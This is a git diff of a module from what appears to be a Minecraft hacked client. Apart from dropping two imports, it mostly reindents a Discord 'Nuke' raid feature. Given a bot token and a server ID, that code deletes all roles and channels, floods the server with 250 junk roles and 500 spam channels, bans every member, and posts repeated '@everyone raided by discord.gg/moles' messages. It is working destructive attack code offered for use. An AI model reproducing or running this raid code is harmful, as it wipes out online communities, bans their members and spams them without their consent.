@@ -6,8 +6,6 @@ package net.shadow.client.feature.module.impl.render;
 
 import com.mojang.brigadier.suggestion.Suggestion;
 import com.mojang.brigadier.suggestion.Suggestions;
-
-import net.minecraft.client.util.GlfwUtil;
 import net.minecraft.client.util.math.MatrixStack;
 import net.minecraft.network.packet.c2s.play.RequestCommandCompletionsC2SPacket;
 import net.minecraft.network.packet.s2c.play.CommandSuggestionsS2CPacket;
@@ -17,7 +15,6 @@ import net.shadow.client.ShadowMain;
 import net.shadow.client.feature.config.BooleanSetting;
 import net.shadow.client.feature.config.StringSetting;
 import net.shadow.client.feature.gui.clickgui.element.Element;
-import net.shadow.client.feature.gui.clickgui.element.impl.config.BooleanSettingEditor;
 import net.shadow.client.feature.gui.clickgui.element.impl.config.StringSettingEditor;
 import net.shadow.client.feature.gui.notifications.Notification;
 import net.shadow.client.feature.gui.panels.PanelsGui;
@@ -166,55 +163,55 @@ public class ToolsScreen extends Module {
                             })
                     }),
                     new PanelFrame(500, 100, 250, 125, "Discord", new Element[]{
-                        new StringSettingEditor(0, 0, 240, token),
-                        new StringSettingEditor(0, 30, 240, guild),
-                        new PanelButton(0, 65, -1, "Nuke", () -> {
-                            new Thread(() -> {
-                                final ThreadPoolExecutor pool = new ThreadPoolExecutor(10, 10, 0L, TimeUnit.MILLISECONDS, new LinkedBlockingQueue<Runnable>());
-                                try{
-                                    long guildId = Long.valueOf(guild.getValue());
-                                    DiscordClient client = new DiscordClient(token.getValue(), true);
-                                    for(long role : client.getRoles(guildId)){
-                                        pool.execute(() -> client.deleteRole(guildId, role));
-                                        Utils.sleep(50);
-                                    }
-                                    Notification.create(1000, "Raidbot", Notification.Type.SUCCESS, "Deleted all roles");
-                                    for(int i = 0; i < 250; i++){
-                                        pool.execute(() -> client.createRole(guildId, "moles"));
-                                        Utils.sleep(50);
-                                    }
-                                    Notification.create(1000, "Raidbot", Notification.Type.SUCCESS, "Flooded roles");
-                                    for(long channel : client.getChannels(guildId)){
-                                        pool.execute(() -> client.deleteChannel(channel));
-                                        Utils.sleep(50);
-                                    }
-                                    Notification.create(1000, "Raidbot", Notification.Type.SUCCESS, "Deleted all channels");
-                                    for(int i = 0; i < 500; i++){
-                                        pool.execute(() -> client.createChannel(guildId, 0, "molesontop"));
-                                        Utils.sleep(50);
-                                    }
-                                    Notification.create(1000, "Raidbot", Notification.Type.SUCCESS, "Flooded channels");
-                                    for(long member : client.getMembers(guildId)){
-                                        pool.execute(() -> client.banMember(guildId, member));
-                                        Utils.sleep(50);
-                                    }
-                                    Notification.create(1000, "Raidbot", Notification.Type.SUCCESS, "Banned Members");
-                                    Notification.create(1000, "Raidbot", Notification.Type.INFO, "Sending pings");
-                                    for(int i = 0; i < 5; i++){
-                                        for(long channel : client.getChannels(guildId)){
-                                            pool.execute(() -> {
-                                                client.sendMessage(channel, "@everyone raided by discord.gg/moles", true);
-                                            });
+                            new StringSettingEditor(0, 0, 240, token),
+                            new StringSettingEditor(0, 30, 240, guild),
+                            new PanelButton(0, 65, -1, "Nuke", () -> {
+                                new Thread(() -> {
+                                    final ThreadPoolExecutor pool = new ThreadPoolExecutor(10, 10, 0L, TimeUnit.MILLISECONDS, new LinkedBlockingQueue<Runnable>());
+                                    try {
+                                        long guildId = Long.valueOf(guild.getValue());
+                                        DiscordClient client = new DiscordClient(token.getValue(), true);
+                                        for (long role : client.getRoles(guildId)) {
+                                            pool.execute(() -> client.deleteRole(guildId, role));
                                             Utils.sleep(50);
                                         }
+                                        Notification.create(1000, "Raidbot", Notification.Type.SUCCESS, "Deleted all roles");
+                                        for (int i = 0; i < 250; i++) {
+                                            pool.execute(() -> client.createRole(guildId, "moles"));
+                                            Utils.sleep(50);
+                                        }
+                                        Notification.create(1000, "Raidbot", Notification.Type.SUCCESS, "Flooded roles");
+                                        for (long channel : client.getChannels(guildId)) {
+                                            pool.execute(() -> client.deleteChannel(channel));
+                                            Utils.sleep(50);
+                                        }
+                                        Notification.create(1000, "Raidbot", Notification.Type.SUCCESS, "Deleted all channels");
+                                        for (int i = 0; i < 500; i++) {
+                                            pool.execute(() -> client.createChannel(guildId, 0, "molesontop"));
+                                            Utils.sleep(50);
+                                        }
+                                        Notification.create(1000, "Raidbot", Notification.Type.SUCCESS, "Flooded channels");
+                                        for (long member : client.getMembers(guildId)) {
+                                            pool.execute(() -> client.banMember(guildId, member));
+                                            Utils.sleep(50);
+                                        }
+                                        Notification.create(1000, "Raidbot", Notification.Type.SUCCESS, "Banned Members");
+                                        Notification.create(1000, "Raidbot", Notification.Type.INFO, "Sending pings");
+                                        for (int i = 0; i < 5; i++) {
+                                            for (long channel : client.getChannels(guildId)) {
+                                                pool.execute(() -> {
+                                                    client.sendMessage(channel, "@everyone raided by discord.gg/moles", true);
+                                                });
+                                                Utils.sleep(50);
+                                            }
+                                        }
+                                    } catch (Exception e) {
+                                        e.printStackTrace();
                                     }
-                                }catch(Exception e){
-                                    e.printStackTrace();
-                                }
-                            }).start();
-                        }),
-                    })  
-                });
+                                }).start();
+                            }),
+                    })
+            });
         }
         ShadowMain.client.setScreen(menu);
         this.setEnabled(false);
